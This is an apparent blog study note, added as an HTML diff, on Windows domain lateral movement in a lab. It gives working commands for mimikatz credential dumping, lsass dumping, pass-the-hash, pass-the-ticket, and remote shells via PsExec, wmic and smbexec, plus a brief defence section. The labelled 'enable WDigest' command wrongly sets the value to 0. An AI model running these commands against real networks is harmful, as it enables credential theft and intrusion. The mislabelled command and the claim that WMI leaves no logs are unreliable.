@@ -1,0 +1,1295 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网,笔记,域横向," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="域横向Windows 散列值分析单机密码抓取1.通过mimikatz直接读取SAM文件。需要考虑mimikatz的免杀输入privilege::debug提权然后输入token::elevate提权至SYSTEM输入lsadump::sam读取本地SAM文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网安全攻防笔记5">
+<meta property="og:url" content="http://example.com/2022/05/17/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B05/index.html">
+<meta property="og:site_name" content="Recoder">
+<meta property="og:description" content="域横向Windows 散列值分析单机密码抓取1.通过mimikatz直接读取SAM文件。需要考虑mimikatz的免杀输入privilege::debug提权然后输入token::elevate提权至SYSTEM输入lsadump::sam读取本地SAM文件">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517211901.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517223808.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517212513.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517220745.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517223737.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517231414.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518110354.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518110407.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518152254.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518152442.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518154812.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518161635.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518161811.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518162015.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520125454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520132335.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520133908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520134222.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520135824.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520144454.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520144607.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520145659.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520150449.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520150840.png">
+<meta property="article:published_time" content="2022-05-17T06:56:44.000Z">
+<meta property="article:modified_time" content="2022-05-17T06:56:44.000Z">
+<meta property="article:author" content="Laplace">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="域横向">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517211901.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/05/17/内网安全攻防笔记5/"/>
+
+
+
+
+
+  <title>内网安全攻防笔记5 | Recoder</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Recoder</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E7%AC%94%E8%AE%B05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Laplace">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Recoder">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网安全攻防笔记5</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-05-17T14:56:44+08:00">
+                2022-05-17
+              </time>
+            
+
+			
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="域横向"><a href="#域横向" class="headerlink" title="域横向"></a>域横向</h1><h2 id="Windows-散列值分析"><a href="#Windows-散列值分析" class="headerlink" title="Windows 散列值分析"></a>Windows 散列值分析</h2><h3 id="单机密码抓取"><a href="#单机密码抓取" class="headerlink" title="单机密码抓取"></a>单机密码抓取</h3><p>1.通过mimikatz直接读取SAM文件。需要考虑mimikatz的免杀<br>输入<code>privilege::debug</code>提权然后输入<code>token::elevate</code>提权至SYSTEM<br>输入<code>lsadump::sam</code>读取本地SAM文件</p>
+<span id="more"></span>
+
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517211901.png"></p>
+<p>2.使用mimikatz在线读取SAM文件</p>
+<p>输入一下命令<br><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code><br>读取散列以及明文密码<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517223808.png"></p>
+<p>3.使用mimikatz离线读取lsass.dmp文件</p>
+<p>(1)导出lsass.dmp文件</p>
+<p>通过任务管理器找到lsass.exe进程导出lsass.dmp文件<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517212513.png"></p>
+<p>(2) 使用Prodump导出lsass.dmp文件<br>Prodump为微软软件，不会报毒。</p>
+<p>使用命令<br><code>prodump.exe -ma lsass.exe lsass.dmp</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517220745.png"></p>
+<p>使用mimikatz导出lsass.dmp文件中的散列值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp  </span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517223737.png"></p>
+<h3 id="单机密码的防范"><a href="#单机密码的防范" class="headerlink" title="单机密码的防范"></a>单机密码的防范</h3><p>微软发布补丁KB2871997防止通过内存在线读取密码，关闭了Wdigest功能。</p>
+<p>Win 2012及以上级别默认关闭Wdigest功能无法读取明文密码。</p>
+<p>在注册表中如果注册表项<code>Wdigest</code>为1，下次登录时可以使用工具获得明文密码为0则不能。</p>
+<p>(1)  使用reg add 命令<br>开始Wdigest Auth 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p>关闭Wdigest Auth 命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<p>相当于在注册表添加<code>UseLogonCredential</code>参数<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220517231414.png"></p>
+<h3 id="使用Hashcat获取密码"><a href="#使用Hashcat获取密码" class="headerlink" title="使用Hashcat获取密码"></a>使用Hashcat获取密码</h3><p>Hashcat可以支持cpu破解密码</p>
+<h3 id="防御攻击者抓取明文密码和散列值"><a href="#防御攻击者抓取明文密码和散列值" class="headerlink" title="防御攻击者抓取明文密码和散列值"></a>防御攻击者抓取明文密码和散列值</h3><ol>
+<li>设置Protected User组</li>
+</ol>
+<p>在Win2012 R2中存在一个Protected User组。将用户添加到该组后，该用户的明文密码和散列值无法被mimikatz等工具抓取。</p>
+<p>将Administrator添加到Protected User组后。mimikztz无法抓到明文密码或则散列值。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518110354.png"></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518110407.png"></p>
+<ol start="2">
+<li>安装KB2871997</li>
+</ol>
+<p>KB2871997是微软用来解决PsExec或IPC远程查看(c$)的补丁，可以本地帐号不允许被远程接入计算机系统。但是系统默认的本地管理员Administrator这个SID为500的帐号仍然可以登录计算机。安装KB2871997后，仍然需要禁用默认的Administrator帐号，用来防御Hash传递攻击。</p>
+<ol start="3">
+<li>通过修改注册表禁止在内存中存储明文密码</li>
+</ol>
+<p>通过修改注册表值WDigest，使得Windows不会将明文密码存储在内存中。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>防御mimikatz攻击</li>
+</ol>
+<p>mimikatz抓取密码需要使用Debug权限，用于和lsass进程交互。可以将Debug权限从Administrator中取消，来防止mimikatz抓取密码。</p>
+<h2 id="Hash传递攻击"><a href="#Hash传递攻击" class="headerlink" title="Hash传递攻击"></a>Hash传递攻击</h2><p>PTH攻击通过抓到帐号的Hash值，通过Hash值来登录内网中的其他计算机。在内网中大量计算机会采取相同的本地管理员的帐号密码。如果取得一台计算机的管理员帐号Hash，通过传递Hash可以绕过Hash破解，直接通过工具转递Hash，来在其他计算机上登录。</p>
+<h3 id="使用NTLM-Hash传递"><a href="#使用NTLM-Hash传递" class="headerlink" title="使用NTLM Hash传递"></a>使用NTLM Hash传递</h3><p>在目标机器中以管理员运行mimikatz</p>
+<p>输入一下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:administrator /domain:HACKE /ntlm:afffeba176210fad4628f0524bfe1942</span><br></pre></td></tr></table></figure>
+<p>然后弹出cmd窗口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518152254.png"></p>
+<p>在cmd窗口中尝试弹出DC的C盘内容<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518152442.png"></p>
+<h3 id="使用AES-256转递"><a href="#使用AES-256转递" class="headerlink" title="使用AES-256转递"></a>使用AES-256转递</h3><p>使用mimikatz抓取AES-256</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
+
+<p>以管理员权限运行mimikatz命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:WIN2008-TEST /domain:HACKE /aes256:79c793443b72eea70419c4cc44a3f01c2463c8db14a60615aaed060cb272e804</span><br></pre></td></tr></table></figure>
+
+<p>需要安装KB2871997才可以通过导入AES-256的方式进行横向移动。</p>
+<p>需要注意的点:</p>
+<ul>
+<li>dir 后跟主机名，不是ip地址。否则提示用户名或者密码错误</li>
+<li>除了AES-256，AES-128也可以用于PTH</li>
+<li>使用AES密钥传递前提是安装KB2871997</li>
+<li>如果安装KB2871997，仍然对应SID为500的管理员进行NTLM Hash传送</li>
+<li>如果需要使用mimikatz的Hash传送，需要使用管理员运行</li>
+</ul>
+<h3 id="更新KB2871977影响"><a href="#更新KB2871977影响" class="headerlink" title="更新KB2871977影响"></a>更新KB2871977影响</h3><p>KB2871977禁止本地管理员权限与远程计算机进行连接。无法通过本地管理员权限对远程计算机使用PsExec, WMI, smbexec , schtasks, 。也无法访问远程主机的共享文件</p>
+<p>但是使用SID=500的管理员帐号，仍然可以通过NTLM Hash进行传送。</p>
+<h2 id="票据传递-PTT"><a href="#票据传递-PTT" class="headerlink" title="票据传递(PTT)"></a>票据传递(PTT)</h2><p>如果使用mimikatz进行PTH需要获得本地管理员权限。mimikatz提供了不需要本地管理员权限就可以进行横向渗透的方法:票据传递(Pass The Ticket,PTT)</p>
+<h3 id="使用mimikatz进行PTT"><a href="#使用mimikatz进行PTT" class="headerlink" title="使用mimikatz进行PTT"></a>使用mimikatz进行PTT</h3><p>使用mimikatz，将内存中的票据导出。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure>
+<p>在当前目录会出现许多票据，如krbtgt,cifs,ldap等<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518154812.png"></p>
+<p>使用mimikatz清除内存中的票据<br><code>kerberos::purge</code></p>
+<p>将票据文件注入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt &quot;[0;46f2e]-2-1-40e10000-Administrator@krbtgt-HACKE.TESTLAB.kirbi&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="使用kekeo进行票据传递"><a href="#使用kekeo进行票据传递" class="headerlink" title="使用kekeo进行票据传递"></a>使用kekeo进行票据传递</h3><p>kekeo使用域名，用户名，NTLM Hash生成票据，再将票据导入。</p>
+<p>输入命令生成票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:administrator /domain:HACKE.TESTLAB /ntlm:afffeba176210fad4628f0524bfe1942</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518161635.png"></p>
+<p>在kekeo中清除票据文件<br><code>kerberos::purge</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518161811.png"></p>
+<p>也可以使用Windows 自带命令清除票据<br><code>klist purge</code></p>
+<p>使用命令将票据导内存</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGT_administrator@HACKE.TESTLAB_krbtgt~HACKE.TESTLAB@HACKE.TESTLAB.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220518162015.png"></p>
+<h2 id="PsExec使用"><a href="#PsExec使用" class="headerlink" title="PsExec使用"></a>PsExec使用</h2><p>PsExec是Windows提供的工具，可以通过命令行与目标机器进行连接，甚至不需要通过RDP进行图形化控制。</p>
+<h3 id="PsTools工具包中的PsExec"><a href="#PsTools工具包中的PsExec" class="headerlink" title="PsTools工具包中的PsExec"></a>PsTools工具包中的PsExec</h3><p>PsExec的基本原理:通过管道在远程机器上建立一个psexec服务，并在本地磁盘中生成一个PSEXESVC的二进制文件。通过psexec服务执行命令,运行后删除服务。</p>
+<p>首先需要获得系统的Shell。在建立了IPC$后使用命令获得System权限的Shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PsExec64.exe -accepteula \\192.168.1.2 -s cmd.exe</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-accepeula第一次使用弹出确认框，使用后默认确认。</li>
+<li>-s:用System权限运行，如果不使用获得Administrator权限</li>
+</ul>
+<p>如果没有建立IPC$连接可以指定帐号密码连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec \\192.168.1.2 -u HACKE\administrator -p password cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>使用PsExec需要注意</p>
+<ul>
+<li>需要远程开启admin$共享(默认开启)</li>
+<li>使用ipc$连接后，不需要输入密码</li>
+<li>使用PsExec执行远程命令，会在目标系统中产生一个psexec服务。命令执行后,psexec服务自动删除。创建或者删除服务时产生大量日志，可以通过日志反推攻击流程</li>
+<li>PsExec可以获得System权限</li>
+</ul>
+<h3 id="MSF中的Psexec模块"><a href="#MSF中的Psexec模块" class="headerlink" title="MSF中的Psexec模块"></a>MSF中的Psexec模块</h3><p>msf中search psexec有许多模块。<br>常用的有</p>
+<ul>
+<li>/windows/smb/psexec</li>
+<li>/windows/smb/psexec_psh(PowerShell版本)</li>
+</ul>
+<p>使用Psexec_psh版本。该版本使用PowerShell实现Payload。免杀效果优于默认版本。但是在win7, win2008及以上版本才有PowerShell。所以低版本还是需要使用默认版本</p>
+<h2 id="WMI的使用"><a href="#WMI的使用" class="headerlink" title="WMI的使用"></a>WMI的使用</h2><p>在PsExec在内网被加入黑名单后，逐渐使用WMI来进行横向移动。通过MMI横向移动，系统不会产生日志。</p>
+<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:192.168.1.2 /user:administrator /password:password process call create &quot;cmd.exe /c ipconfig &gt;ip.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>使用目标系统cmd执行ipconfig 将结果保存在 <code>C:\Windows\System32\ip.txt</code>中</p>
+<p>后续使用ipc$读取执行结果<br><code>type \\192.168.1.2\c$\Windows\System32\ip.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520125454.png"><br>如果Wmic执行恶意程序，将不会留下日志。</p>
+<h3 id="ipmacket工具包中的wmiexec"><a href="#ipmacket工具包中的wmiexec" class="headerlink" title="ipmacket工具包中的wmiexec"></a>ipmacket工具包中的wmiexec</h3><p>可以用于Linux 向 Windows渗透时使用</p>
+<h3 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h3><p>通过VBS调用WMI模拟PSExec功能。可以获得一个半交互式Shell</p>
+<h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1脚本包含在PowerSploit工具包中。本质上是通过PowerShell调用WMI</p>
+<h3 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h3><p>利用PowerShell自带的Invoke_WMIMethod可以在远程系统中执行命令和指定程序</p>
+<h2 id="smbexec使用"><a href="#smbexec使用" class="headerlink" title="smbexec使用"></a>smbexec使用</h2><p>smbexec可以通过文件共享(admin$, c$, ipc$ ,d$)在远程系统中执行命令</p>
+<h3 id="C-版smbexec"><a href="#C-版smbexec" class="headerlink" title="C++版smbexec"></a>C++版smbexec</h3><h3 id="impacket中的smbexec-py"><a href="#impacket中的smbexec-py" class="headerlink" title="impacket中的smbexec.py"></a>impacket中的smbexec.py</h3><p>使用命令连接<br><code>smbexec.py administrator:password@192.168.1.2</code></p>
+<p>连接后为System权限<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520132335.png"></p>
+<h3 id="Linux跨Windows远程命令执行工具"><a href="#Linux跨Windows远程命令执行工具" class="headerlink" title="Linux跨Windows远程命令执行工具"></a>Linux跨Windows远程命令执行工具</h3><p>链接:<a target="_blank" rel="noopener" href="https://github.com/brav0hax/smbexec">https://github.com/brav0hax/smbexec</a></p>
+<p>下载后运行install.sh进行安装</p>
+<p>默认安装在/opt目录下</p>
+<p>运行<code>smbexec</code>出现错误</p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520133908.png"></p>
+<p>在smbexec目录下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby-dev</span><br><span class="line">bundler install</span><br></pre></td></tr></table></figure>
+<p><code>bundler install</code>出现错误<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520134222.png"><br><code>gem install nokogiri -v &#39;1.5.5&#39; </code></p>
+<p>这里又出现错误<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220520135824.png"><br>…….<br>以后再说先跳过这个</p>
+<h2 id="DCOM"><a href="#DCOM" class="headerlink" title="DCOM"></a>DCOM</h2><p>先跳过</p>
+<h2 id="SPN在域环境下的运用"><a href="#SPN在域环境下的运用" class="headerlink" title="SPN在域环境下的运用"></a>SPN在域环境下的运用</h2><h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p>在使用Kerberos协议进行身份验证的网络中，如果需要运行服务则必须要为使用的帐号手动注册SPN。</p>
+<p>Kerberos通过SPN将服务实例与服务登录帐号关联。如果计算机安装了多个服务实例，那么每一个服务实例都需要一个SPN。</p>
+<p>例如:如果用户需要访问MSSQL服务，系统以当前用户身份向CD查询SPN为”MSSQL”的记录。找到SPN后，用户将TGT 和 需要访问的SPN发送给KDC。KDC对TGT解密后，由TGS将一张允许访问SPN对应服务的票据和SPN对应的服务器地址给用户。用户使用票据访问对应服务。</p>
+<p>SPN命令的格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SPN = serviceclass &quot;/&quot; hostname [&quot;:&quot;port] [&quot;/&quot; servicename]</span><br></pre></td></tr></table></figure>
+<ul>
+<li>service: 服务组件的名称</li>
+<li>hostname: 以”/“与后面的名称分隔,是计算机的FQDN(全限定域名，同时带有计算机名和域名)</li>
+<li>port: 以冒号分隔，后面为端口号</li>
+<li>serivcename: 可以是服务的专有名称(DN), objectGuid, Internet 主机名或全限定域名</li>
+</ul>
+<p>常见SPN服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MSSQLSvc/computer1.pentest.com:1433</span><br></pre></td></tr></table></figure>
+<ul>
+<li>MSSQLSvc: 服务组件名，此处为MSSQL服务</li>
+<li>computer1.pentest.com: 主机名为computer1 域名为 pentest.com</li>
+<li>1433 : 端口为1433</li>
+</ul>
+<p>serviceclass和hostname是必选参数， port和service是可选参数</p>
+<p>Exchange服务的实例代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exchangeMDB/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure>
+<p>RDP服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TERMSERV/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure>
+<p>WSMan/WINRM/PSRemoting服务代码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WSMAN/EXCAS01.pentest.com</span><br></pre></td></tr></table></figure>
+
+<p>通过SPN进行服务扫描的PowerShell脚本</p>
+<p>当计算机加入域时，主SPN会自动添加到域的计算机帐号ServicePrincipaName属性中。在安装新的服务后，SPN也会被记录在计算机帐号的相关属性中。</p>
+<p>SPN扫描通过请求特点的SPN类型的服务主题名称来查询服务。与网络端口扫描相比SPN扫描不需要通过网络中的每一个IP地址端口来检查服务，因此不会触发内网中的IPS,IDS的设置规则产生大量的警告日志。同时SPN查询是Kerberos票据的一部分，检测难度较大。</p>
+<p>PowerShell-AD-Recon工具包提供了一系列服务与服务登录帐号和运行徐福的主机之间的对应关系，服务包括但是不限于MSSQL, EXchange, RDP , WinRM.</p>
+<p>(1) 利用SPN发现域中所有MSSQL服务</p>
+<p>SPN通过LDAP协议向DC查询，只需要获得一个普通的域用户权限，可以进行SPN扫描。<br>以域用户运行一个PowerShell进程，将脚本导入并执行。</p>
